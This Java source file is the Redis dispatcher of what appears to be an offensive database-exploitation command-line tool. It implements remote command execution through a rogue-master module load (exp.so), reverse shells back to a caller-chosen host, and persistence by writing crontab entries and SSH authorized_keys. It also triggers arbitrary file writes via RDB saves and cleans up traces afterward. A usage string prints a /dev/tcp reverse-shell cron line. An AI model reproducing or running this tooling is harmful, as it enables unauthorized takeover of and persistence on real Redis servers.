package cli.dispatcher;

import cli.Args;
import cli.Ctx;
import cli.Result;
import Dao.RedisDao;
import org.json.JSONObject;
import redis.clients.jedis.Jedis;

import java.util.Map;

/**
 * Redis 分发：info / exec（system.exec；模块部署走 --vps-* 外部 rogue 范式）/ clean / revshell
 * + crontab / sshkey / rdb（变异操作，持写锁）；文件五件套与 CVE 扫描 M3a。
 */
public class RedisDispatcher extends BaseDispatcher {

    @Override
    public String dbType() {
        return "redis";
    }

    @Override
    public Result handle(String tool, Args.Parsed p, Ctx ctx) throws Exception {
        String id = flag(p, "id", "");
        Map<String, String> rec = loadConn(ctx, id, dbType());
        String code = ctx.enc.isEmpty() ? "UTF-8" : ctx.enc;
        RedisDao dao = new RedisDao(rec.get("ipaddress"), rec.get("port"), rec.get("password"),
                String.valueOf(ctx.timeoutSec));
        dao.setReporter(ctx.reporter);

        if ("sql".equals(tool)) {
            return Result.usage("redis 无 SQL 面", "命令执行用 exec（需模块）；键操作后续经 doctor 建议的通道").withId(id);
        }
        if ("info".equals(tool)) {
            dao.getConnection();
            dao.getInfo();
            JSONObject d = new JSONObject();
            d.put("version", nz(dao.getRedisVersion()));
            d.put("os", nz(dao.getOs()));
            d.put("arch_bits", nz(dao.getArch()));
            d.put("cves", new org.json.JSONArray());
            return Result.ok("Redis " + nz(dao.getRedisVersion()) + " / " + nz(dao.getOs())
                    + " / " + nz(dao.getArch()) + "bit", d).withId(id);
        }
        if ("exec".equals(tool)) {
            String cmd = p.positionals.get(0);
            dao.getConnection();
            String vpsHost = flag(p, "vps-host", "");
            String vpsPort = flag(p, "vps-port", "");
            if (!vpsHost.isEmpty() && !vpsPort.isEmpty()) {
                // rogue 外部范式：伪主库由调用方先行启动（SKILL 纪律 6），CLI 只做主从对接与模块装载
                dao.rogue(vpsHost, vpsPort, Math.max(ctx.timeoutSec, 5) * 1000);
            }
            if (!moduleLoaded(dao)) {
                return Result.target("system 模块未加载，无法 system.exec",
                        "先部署模块: exec --vps-host <rogue地址> --vps-port <rogue端口>（需外部 rogue 进程 + 预编译 exp.so）；用后 clean").withId(id);
            }
            return Result.ok(nz(dao.eval(cmd, code))).withId(id);
        }
        if ("clean".equals(tool)) {
            dao.getConnection();
            if (dao.getDirConfig() == null) {
                dao.getInfo(); // clean 依赖 dir 原值
            }
            dao.clean();
            return Result.ok("clean 完成（dir/dbfilename/slave-read-only 还原，exp.so 删除，模块卸载）").withId(id);
        }
        if ("revshell".equals(tool)) {
            dao.getConnection();
            if (!moduleLoaded(dao)) {
                return Result.target("system 模块未加载，无法 system.rev",
                        "先 exec --vps-host .. --vps-port .. 部署模块（外部 rogue）；或用 crontab/sshkey 路线").withId(id);
            }
            dao.revShell(p.positionals.get(0), p.positionals.get(1));
            return Result.ok("revshell 已发起（回连 " + p.positionals.get(0) + ":" + p.positionals.get(1) + "）").withId(id);
        }
        if ("crontab".equals(tool)) {
            dao.getConnection();
            String line = p.positionals.isEmpty() ? "" : p.positionals.get(0);
            if (line.isEmpty()) {
                return Result.usage("crontab 需要 cron 行内容",
                        "例: mdut crontab --id 1 '*/1 * * * * /bin/sh -i >& /dev/tcp/IP/PORT 0>&1'").withId(id);
            }
            dao.crontab(line);
            return Result.ok("crontab 写入流程完成（成功与否见 stderr 明细）").withId(id);
        }
        if ("sshkey".equals(tool)) {
            dao.getConnection();
            String path = flag(p, "path", "/root/.ssh/");
            dao.sshkey(flag(p, "pubkey", ""), path);
            return Result.ok("sshkey 写入流程完成（目标 " + path + "authorized_keys，见 stderr 明细）").withId(id);
        }
        if ("rdb".equals(tool)) {
            dao.getConnection();
            dao.redisavedb(flag(p, "dir", ""), flag(p, "file", ""));
            return Result.ok("rdb 持久化已触发（dir=" + flag(p, "dir", "") + " file=" + flag(p, "file", "") + "）").withId(id);
        }
        if ("list-files".equals(tool) || "read".equals(tool) || "write".equals(tool)
                || "upload".equals(tool) || "download".equals(tool) || "rm".equals(tool) || "mkdir".equals(tool)) {
            return m3a(tool, dbType()).withId(id);
        }
        return Result.usage("redis 不支持命令: " + tool, "mdut --help 查看命令清单").withId(id);
    }

    private boolean moduleLoaded(RedisDao dao) {
        try {
            Jedis j = dao.jedis();
            return j != null && !j.moduleList().isEmpty();
        } catch (Throwable t) {
            // 老版本 redis 无 MODULE LIST 时保守放行，由 eval 自身报错
            return true;
        }
    }

    private static String nz(String s) {
        return s == null ? "" : s;
    }
}
